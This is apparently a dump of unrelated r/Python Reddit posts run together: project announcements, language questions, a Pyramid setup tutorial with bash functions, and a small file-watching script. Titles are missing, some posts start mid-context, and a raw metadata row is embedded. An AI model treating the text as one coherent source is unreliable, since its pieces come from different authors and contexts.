It's not a matter of being able to use github--there's no problem with it. There's an issue with posting code that does not have such permissible license. We're just simply not allowed to for a lot of the work. Sure, we could use private accounts, but we would still be violating the policy in a more devious manner. This allows anyone to deploy a gist.github-like setup on their local server where it can be isolated if needed.

____

**Dependencies**

There's a requirements.txt. If you use pip then just follow the readme. 

____

**Forking and Testing**

Fork on GitHub: https://github.com/justinvh/quark-paste

You can **try it out** here: http://quark-paste.herokuapp.com/paste/

____

**To-do**:

I've only put about a days worth of work into this, but it is in the usable state now. So, feel free to try it out, fork, edit, etc! With that said, I'll probably be adding these features in the upcoming day(s):


    ✓ Add forking (fork anonymously!)
    ✓ Add downloading (you can download individual files)
    ✓ Add searching (uses Haystack and Whoosh 
    ✓ Add commenting (login to add comments) 
    ✓ Fix odd styling of line numbers (fixed widths, hacked resize())
    ✓ Adopting commits and pastes (login to adopt anonymous commits and pastes)
    ✓ Allowing tabbing in the textarea (you now can tab in the textarea! Huzzah)
    ✓ Post as anonymous directly (now you can remain anonymous even logged in, thanks not_mad_just_upset
    ✓ Add markdown support for comments
    ✓ Show diffs
    ✓ Fix some of the ordering issues (added sorting and priority-based pastes)
    ✓ Refine the user pages (masking email, anonymous, timezones)
    ✓ Add timezone support
    ✓ Preferences to hide email address
    ✓ Gravatar support (set USE_ICONS in settings.py to TRUE)    
    ✓ Add repository downloading

    x Add cloning (needs to be done via Apache or equivalent)


EDIT: *Please don't use real email addresses. Just create test accounts or stay anonymous! This is meant to be deployed in a more isolated environment where having actual email accounts, etc. would be much more useful.*

EDIT: Well, the downside of Heroku is when I re-deploy **I lose the entire repository directory**, so it is not the best testing solution for this particular project. If something crashes on an edit I am sorry. I will be regularly clearing out the database while I add new features.

Chemlab is a new python chemistry package that will make your life easier. It boosts a molecular viewer, it's fast, and has full documentation.

I started this project about one year ago during my master's study. A lot of my time was spent in building geometries, running calculations and parsing the results and to do that I had to use different and somewhat awkward programs. What I really needed was a package that could simplify those tasks. Python has a lot of ready-made and high quality libraries to read, process and analyse data. Chemlab naturally fits in this ecosystem by bringing numpy friendly data structures and a brand new molecular viewer.

Please help this project by testing and participating in the development!

The interesting part is I'm not actually part of the IT department and they (a year ago) said I could use Python on the understanding I would get no support from them, they were advocating PHP. Due to my own experiences with the two and the project I would be undertaking I picked Python.

Fast forward to today and some other people from IT have performed a code review as the project has been far more successful than they anticipated and people are sitting up and taking notice. The main question they're asking has to do with Python, why am I using it? I've not had a chance to meet the questioners yet but I'm told some of them code in Python themselves and that the main suggestion coming from IT is to use Java instead.

I've had some exposure to Java but not a lot. I understand it's compiled to Byte-code, uses the JVM etc and that it's very popular in more established businesses. What I don't know (beyond what a simple Google search will tell me) is why I would pick one or the other.

I'm not after ""Python is better than Java"", I'm genuinly curious to hear from people experienced in both which aspects of each make them good for different problems. Is it that Java is a lot better past the 10k loc mark? Is it that Java is so much faster than Python?

For some time, it's been rather a diamond in the rough: the documentation left something to be desired, the sole committer didn't have much time to spend on it, and it's not as well known as its 'competitors'.

I've got the author's permission to try to revitalise cx_Freeze development. I've put the source code [on Bitbucket](https://bitbucket.org/takluyver/cx-freeze), and started working on [better docs](http://cx_freeze.readthedocs.org/en/latest/index.html).

Now the project needs *you*. If you're interested in distributing Python-based applications to people, come and pitch in. You can expand the documentation, add comments to the code, work on something from the [issue tracker](http://sourceforge.net/tracker/?group_id=84937), or make any other improvements.

This is the end result of about three years of descent into the madness that is the world of password hashing algorithms (I'm looking at you, raw md5 digest of password). I've been maintaining this library internally at my company for a while now, adding new features as they are needed, and finally decided to release it BSD-style.

It slices, it dices, it's got support for over 20 common hash algorithms, with documentation and occasional comments about their security. 

I hope you application developers out there find useful!

I remember endless sheets of papers with ""wonderful"" ideas that would allow me to quit my job and enjoy my free time. My problem was that I was never able to take any of these ideas to completion. There was always a new idea on the horizon, or a distraction like work, family, school, etc. 

I'm a mechanical engineer by training, so I knew enough programming to do it myself. I first learned PHP, then with the web 2.0 craze I tried ROR and failed miserably. Finally last year, I thought I would give it another try. This time I did some research and found Django and Python. I worked through the tutorial and I was sold. Slowly but surely, I started programming, and learning. I bought the ""Practical Django Projects"" book which was a great resource and just kept at it when I could. It was like building a very complicated lego set, where I would build a section, come back to it, and keep building. Fast forward to a year later, and I have finally launched my first website from scratch. It's just an awesome feeling seeing how all the pieces have come together. In the process I learned OOP and was able to write my first classes, and understood how inheritance could help me avoid copy-pasting code. 

Anyway, I wanted to share the final product: http://www.lookingforcoupons.com. I'm so proud of the fact that I finally was able to follow through and complete something, anything! 

To all you python/django newbies, keep at it, it will come eventually. 

Thanks to everyone here for the inspiration!


**edit:** Spelling (thanks punning linguist)


**edit2:** Wow, thanks for all the comments!!! For those interested, I started out with a pre-made design which I bought here: http://themeforest.net/ , really cheap and professional looking designs! I've always liked web design, so I know enough photoshop and css to be able to modify stuff. It also took a year because I had to learn a little jquery. The most time consuming and difficult part was the webdesign, not the programming, Django makes things so simple!!!! If I would do another site, I'd mostly likely team up with someone or hire a web-designer!


**edit3,4,5,6:**
My 7 tips for finishing your web projects:

* Keep it simple: Build something simple and don't let features creep up. (Do users really need the x and y feature: probably not) . 

* Don't tell anyone until you're finished: For some reason I'd always tell people about my super awesome web-projects and then get embarrassed when they asked after I had given up.

* Set small daily incremental goals: Something that really helped me would be to set a specific goal every time I sat down to code: finish x before I go to sleep.

* Avoid the internet while working: Turn off your wireless or un plug your lan cable, keep a pdf of django and python docs locally so there is no need to go back. Your reward for finishing x today is to check reddit :)

* Avoid the self reinforcing give-up cycle: I would always tend to give up or lose interest in my web projects when I discovered a site that did things better, or when things were taking too long. So just FYI, every website has already been invented and someone has a better version of what you are building; building a website is a long process, the internet will still be there when you're done. 

* Ask for help: There are many online communities, including reddit, that will help you out when you get stuck or don't know how to implement something. Good examples include http://stackoverflow.com/.

* Learn the underlying programming language of your framework: You can't get around it, to build a Django website, you're going to need to learn python. I started by learning Django and eventually bought a Python book.

* Don't reinvent the wheel: most everything you need for a simple (and complicated) web site has already been built and for the most part is already a part of Django. For example: Search -&gt; http://haystacksearch.org/ Comments -&gt; http://docs.djangoproject.com/en/dev/ref/contrib/comments/   even stuff you didn't know you needed -&gt; http://docs.djangoproject.com/en/dev/ref/contrib/sitemaps/

I know that java could be better solution for making an android game but I really like python so I decided to use python along with pygame ofc.
It's fun and a great learning opportunity.

I also know about [this](http://pygame.renpy.org) subset for android but since I'm not very experienced with python and pygame(never made a game before), I am starting to worry that I bit off more than I could chew. Some say it's a very bad idea because it gives you alot of unnecessary trouble.

Does anyone has any experience with games for android written in python?

I've just switched to [Komodo Edit](http://www.activestate.com/komodo-edit) due to some people in the Python community mentioning it on sites like Stack Overflow, Quora etc...

Gotta say, as a die hard Notepad++ user, Komodo Edit just blows it of the water. Sure its a heaver download, larger memory footprint and can be slower to start on some systems, but it is amazing for its autocomplete and calltips for Python.

Speeding up my adoption of Python 1000% already.

Enter Office Scripts: a community and resource that you can use to develop your own scripts to ease your way around your desktop and/or automate certain tasks.  While you don’t need to contribute to the Office Scripts project in order to use the community, if you think what you're working on would help other people out, we'd love to share it!

While the point of Office Scripts is to create a pool of scripts that we can all share, the community will act as a channel for new students of programming (and Python) to learn the fundamentals of creating and packaging code, as well as revision control.

We're over at [r/OfficeScripts](http://www.reddit.com/r/OfficeScripts), come say hi! We'd love to see what you guys have been hacking together!

Plus they were slowing us down quite a bit.

Right now its only dependency is Django, it supports email alert for updates, has bundled style, a permission like public/private/internal status, optional anonymous questions/responses, categories, searching, and a few more I've missed.

What I'd like to do is: extend tests, class based views, parse incoming emails as questions &amp; response (this is important for help desks), better mod tools and internationalization.

Anyways, see the GitHub repo: https://github.com/zapier/django-knowledge, the docs: http://django-knowledge.readthedocs.org/en/latest/index.html or check out a live demo at Zapier: https://zapier.com/support/

We've also registered django-knowledge.org. If anyone has thoughts on a good, cheap lightweight host, let me know.

I would have to think for a while to write the equivalent code in C but it was almost second nature in python after getting half way through Unit 3 of CS 101 on udacity. I can't wait to actually make something with python!

1337349671.0,71,self.Python,tt9gb,Would anyone be interested in a blog post about getting up and running with Pyramid?,EhWardo,95,24,21,http://www.reddit.com/r/Python/comments/tt9gb/would_anyone_be_interested_in_a_blog_post_about/,"I recently looked into learning the Pyramid framework coming from Django and I have been writing about it. 

I also wrote two a short bash scripts (one that uses the starter scaffold and the other that uses the alchemy scaffold) to automate the creation of a development environment, creation of pyramid project, installing the pyramid project, and starting up the server. 

If anyone is interested just let me know and I will just post it here. I will of course post the two scripts that I use along with the post and if anyone more experienced with bash stuff could possibly give suggestions to make it better please do I am kind of a scrub at it.

####Up and Running with Pyramid on Mac OSX

This is a small tutorial on how to get up and running using the [Pyramid](http://www.pylonsproject.org/) framework. I figured since [reddit](http://www.reddit.com/) uses it and it is Python 3 compatible, it has to be solid :).

####Initial Dependencies

* [Python](http://www.python.org/) - I am using Python 3.2.3 but this guide should be ""fairly"" compatible with earlier versions.
* [virtualenv](http://www.virtualenv.org/en/latest/index.html) - Used to keep external python libraries/dependencies separated by project. Beginners may not realize why this is useful but 
* [virtualenvwrapper](http://www.doughellmann.com/projects/virtualenvwrapper/) - This one really isn't ""required"" but I really like it because it makes the already trivial virtualenv even easier!

In order to get started with virtualenvwrapper one must put these configurations in their .bash_profile or .bashrc or wherever you store your bash stuff.

    #This line creates a place for the virtualenvs
    #to be stored as well as some virtualenvwrapper
    #unix executables
    export WORKON_HOME=$HOME/VIRTUALENVS
    
    #This line sets a project home where empty directories
    #will be created that relate to the virtualenv
    export PROJECT_HOME=$HOME/PROJECTS
    
    #This tells adds this file to the path so that commands
    #like mkproject and workon are recognized
    source /usr/local/bin/virtualenvwrapper.sh


This is really all you need to get started with Pyramid. The next parts will detail how to get pyramid installed, set up, and working.

####How to Pyramid


Assuming the above dependencies and virtualenvwrapper configured I can type the following command in my Terminal:

    mkproject --python=python3 MY_PROJECT_DIRECTORY
    
This command will make a virtualenv and bind it to a project directory named the same as the environment. In the future to activate the virtualenv and move to the directory in the projects folder one can use:

    workon MY_PROJECT_DIRECTORY
    
The next step is to actually install the Pyramid framework. This is stupid simple with the virtualenv activated all you need to do is:

    pip install zope.interface==3.8 pyramid
    
This command will install pyramid and all of its dependencies. One must prepend `zope.interface==3.8` to make it compatible with Python 3.2 (I have not tested on Python 2.x). After that is done (it may take a while) the easiest way to get up and running with Pyramid is to use one of its scaffolds to create the initial structure/design of your project.

I use git for version control so in my project directory i run:

    git init
    
This will initialize a new git repo for version control. I want my project to have a database and use SQLAlchemy so I use the alchemy scaffold with this command while being in my project directory.

    pcreate -s alchemy MY_PROJECT_NAME
    
Boom! There you have a project structure that can use have a database using SQLAlchemy. The next step is to install your newly created project for development. This is done by running this command with the virtualenv activated and the command line inside MY_PROJECT_NAME:

    python setup.py develop
    
This command installs a distribution of your project in site-packages which makes it discoverable to import statements and Pyramid commands.

We are getting really close to seeing some stuff in a browser!

The next two steps initialize the database and run the waitress server.

    initialize_MY_PROJECT_NAME_db development.ini
    pserve development.ini --reload
    
The `--reload` option means that if changes are made to .py or .ini files the server will restart which makes development quicker and easier.

Well you should now have a working site using Pyramid!

####For the lazy...

I have written two scripts (one for starter and one for alchemy project scaffolds) and here they are.

    buildapyramid () {
        local TEMP_INPUT=$1: $1 &amp;&amp;
        local PROJECT_NAME=${TEMP_INPUT%?} &amp;&amp;
        mkproject --python=python3 $PROJECT_NAME &amp;&amp;
        git init &amp;&amp;
        touch README.md &amp;&amp;
        #Using zope.interface==3.8 for backwards compatability with Python 3
        pip install zope.interface==3.8.0 pyramid &amp;&amp;
        pcreate -s starter $PROJECT_NAME &amp;&amp;
        cd $PROJECT_NAME &amp;&amp;
        python setup.py develop &amp;&amp;
        pserve development.ini --reload
    }
    
    architectapyramid () {
        local TEMP_INPUT=$1: $1 &amp;&amp;
        local PROJECT_NAME=${TEMP_INPUT%?} &amp;&amp;
        mkproject --python=python3 $PROJECT_NAME &amp;&amp;
        git init &amp;&amp;
        touch README.md &amp;&amp;
        #Using zope.interface==3.8 for backwards compatability with Python 3
        pip install zope.interface==3.8.0 pyramid &amp;&amp;
        pcreate -s alchemy $PROJECT_NAME &amp;&amp;
        cd $PROJECT_NAME &amp;&amp;
        python setup.py develop &amp;&amp;
        initialize_${PROJECT_NAME}_db development.ini &amp;&amp;
        pserve development.ini --reload
    }

Though I really like Python, I'm sure PHP is a decent enough language despite the bad press it gets. I'm also sure I could pick up PHP without too much trouble.

I don't want to have to learn yet another way of writing a for loop or handling objects when I should be learning other things.

I think that most of the offshore competition uses PHP, so there's that to consider. And if you are writing or rewriting a website from scratch for a non-technical client, I'm sure they wouldn't care what language or framework you used.

I have never taken computer science courses, but taught myself by reading things like 'Learning Python' and 'Programming Python' a couple years ago. 

While I can do everything I want to do in Python with my existing knowledge, I'd like to really elevate my coding skill to more of a CS-quality level. I imagine there are many commands in Python that I don't know, or necessarily need to know, but which might help my coding. Furthermore, I'd like to improve the professionalism of my code as I might like to contribute to some open source projects in the future and don't want my contributions to look n00bish. 

Any suggestions for how I might go about this? Are there any good websites perhaps that teach a little bit of obscure python every day that I could subscribe via RSS feed or something? Or is it just something I need ""to do""?

- [Mark Pilgrim's Dive Into Python 3](http://www.diveinto.org/python3/packaging.html)

- even [Learn Python The Hard Way](http://learnpythonthehardway.org/book/ex46.html)

Some immediate differences I see:

- Importing `setuptools` vs. `distutils` vs `setuptools` with fallback to `distutils`.
- How to run the upload, registering, testing, etc. commands: `Makefile` vs. Command-line arguments to `setup.py`.

I tried to combine my favorite aspects of the above in a recent project. Here's the [setup.py](https://github.com/sloria/TextBlob/blob/master/setup.py).

I wanted to share this program I wrote.  I'm using it to determine the best areas to buy property for our school which is relocating.  We want to be as close to all our current members as possible.  This could be a useful web app also, but I'd have to rewrite it to use a database (instead of .csv files) and to use open auth so users can log in as google users (otherwise, the site would use way to many Google API queries). 

Screen shots: http://imgur.com/a/fnVvs

Repo: https://bitbucket.org/permafacture/where-we-meet/


Contour lines are generated by matplotlib

Improvements are on the way.  Beyond just making everything more robust, next is weighting some users drive times to favor changing peoples drive times as little as possible, or dis-preferring some users driving over some amount of time (at the cost of having others drive longer).

The result will be a list of the ""comments"" thread for each saved link, which you can then use to navigate to the saved link in a single click.

Simply put the source HTML from your ""saved"" webpage when logged into reddit into an ANSI text file, put it in ./input/&lt;filename&gt;.txt 

You will get out ./links/&lt;filename&gt;.DATETIME.csv

Don't forget about the dependency!    csvextract.py just needs to be in the same ./ as the savedlinkextractor.py file.

**Structure things like this:**

./ contains these two .py files

./input contains your &lt;filename&gt;.txt   **SAVE IT IN ANSI!!**

the application will take care of the rest!

So I thought figuring it out and documenting it conclusively would make a wonderfully useful blog for someone (certainly better than another straw man web framework microbenchmark, for example).

`python -m` followed by one of these module names will..

* `json.tool` -&gt; pretty prints JSON
* `SimpleHTTPServer` -&gt; serve the current directory over HTTP on port 8080 
 * `quopri` / `uu` / `binhex` / `base64` -&gt; encode / decode Quoted-Printable / UUEncoded content.
 * `telnetlib` -&gt; ghetto telnet client
 * `filecmp` -&gt; directory entry comparison tool
 * `ftplib` -&gt; ghetto FTP client
 * `smtpd` -&gt; SMTP proxy
 * `timeit` -&gt; command line profiling interface. Very handy
 * `calendar` -&gt; prints year calendar
 * `urllib` -&gt; ghetto wget
 * `zipfile` -&gt; ghetto info-zip

There's plenty more in there. `timeit, json.tool, and SimpleHTTPServer` are particularly useful. SimpleHTTPServer has worked like that for as long as I've been using Python, it's one of my favourite ninja sysadmin tricks, especially for getting files off some crummy old server",,False,,t5_2qh0y,True,,,True,t3_fofan,http://www.reddit.com/r/Python/comments/fofan/suggestion_for_a_python_blogger_figure_out_what/,

Take any one liner you are running after changing some files, coding for example... preferably in a language that doesn't have an explicit compilation step in its workflow. You make some changes, save, run the one liner, damn made a mistake, ok fix, run command, hmm no still not there...ah there it is, fix that... yep it works. 

The annoying step in this is switching to your command line every time you make a change.

This script takes a list of files in the stdin and monitors them for changes. If any of the files change it runs the command you give as arguments. Assuming you call this script ""change"" I've been using it like this:

    find . -iname '*.py' | change nosetests -s

Now that's running the background somewhere, you can make changes to your code and run the changes every time you press save. Thoughts?

Here's the code:

    #!/usr/bin/env python
    import sys
    import os
    import stat
    import time
    tomon = sys.stdin.readlines()
    command = "" "".join(sys.argv[1:])
    if(command==""""): raise Exception(""No command given"")
    curval = 0
    while True:
        val = 0
        for monitor in tomon:
            monitor = monitor.strip()
            stats = os.stat (monitor)
            val += stats [stat.ST_SIZE] + stats [stat.ST_MTIME]
        if curval != val:
            os.system(command)
        curval = val
